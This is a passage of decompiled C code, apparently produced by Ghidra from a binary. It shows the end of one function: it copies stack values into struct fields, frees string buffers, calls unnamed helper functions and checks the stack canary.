    param_1[0x25] = uStack_70;
    param_1[0x24] = uStack_78;
    param_1[0x27] = uStack_60;
    param_1[0x26] = local_68;
    param_1[0x29] = uStack_50;
    param_1[0x28] = uStack_58;
    param_1[0x1b] = uStack_c0;
    param_1[0x1a] = local_c8;
    param_1[0x1d] = uStack_b0;
    param_1[0x1c] = uStack_b8;
    param_1[0x1f] = uStack_a0;
    param_1[0x1e] = local_a8;
    param_1[0x21] = uStack_90;
    param_1[0x20] = uStack_98;
    param_1[0x13] = uStack_100;
    param_1[0x12] = local_108;
    param_1[0x15] = uStack_f0;
    param_1[0x14] = uStack_f8;
    param_1[0x17] = uStack_e0;
    param_1[0x16] = local_e8;
    param_1[0x19] = uStack_d0;
    param_1[0x18] = uStack_d8;
    param_1[0xb] = uStack_140;
    param_1[10] = local_148;
    param_1[0xd] = uStack_130;
    param_1[0xc] = local_138;
    param_1[0xf] = uStack_120;
    param_1[0xe] = local_128;
    param_1[0x11] = uStack_110;
    param_1[0x10] = local_118;
  }
  param_1[0x29] = param_1[0x29];
  if ((local_160[0] & 1) != 0) {
    free(local_150);
  }
  if ((local_178[0] & 1) != 0) {
    free(local_168);
  }
  FUN_002036bc(local_190,param_1 + 4);
  FUN_001ba254(local_160,param_1,local_190);
  pvVar10 = (void *)((ulong)local_160 | 1);
  if ((local_160[0] & 1) != 0) {
    pvVar10 = local_150;
  }
  FUN_001bcae8(&local_148,pvVar10,0);
  if (param_1 + 0x2a != &local_148) {
    param_1[0x43] = uStack_80;
    param_1[0x42] = local_88;
    param_1[0x45] = uStack_70;
    param_1[0x44] = uStack_78;
    param_1[0x47] = uStack_60;
    param_1[0x46] = local_68;
    param_1[0x49] = uStack_50;
    param_1[0x48] = uStack_58;
    param_1[0x3b] = uStack_c0;
    param_1[0x3a] = local_c8;
    param_1[0x3d] = uStack_b0;
    param_1[0x3c] = uStack_b8;
    param_1[0x3f] = uStack_a0;
    param_1[0x3e] = local_a8;
    param_1[0x41] = uStack_90;
    param_1[0x40] = uStack_98;
    param_1[0x33] = uStack_100;
    param_1[0x32] = local_108;
    param_1[0x35] = uStack_f0;
    param_1[0x34] = uStack_f8;
    param_1[0x37] = uStack_e0;
    param_1[0x36] = local_e8;
    param_1[0x39] = uStack_d0;
    param_1[0x38] = uStack_d8;
    param_1[0x2b] = uStack_140;
    param_1[0x2a] = local_148;
    param_1[0x2d] = uStack_130;
    param_1[0x2c] = local_138;
    param_1[0x2f] = uStack_120;
    param_1[0x2e] = local_128;
    param_1[0x31] = uStack_110;
    param_1[0x30] = local_118;
  }
  param_1[0x49] = param_1[0x49];
  if ((local_160[0] & 1) != 0) {
    free(local_150);
  }
  if ((local_190[0] & 1) == 0) {
    if (*(long *)(lVar2 + 0x28) != local_48) {
LAB_001ba128:
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
  }
  else {
    free(local_180);
    if (*(long *)(lVar2 + 0x28) != local_48) goto LAB_001ba128;
  }
  return;
}



// ----------------------------------------------------------------


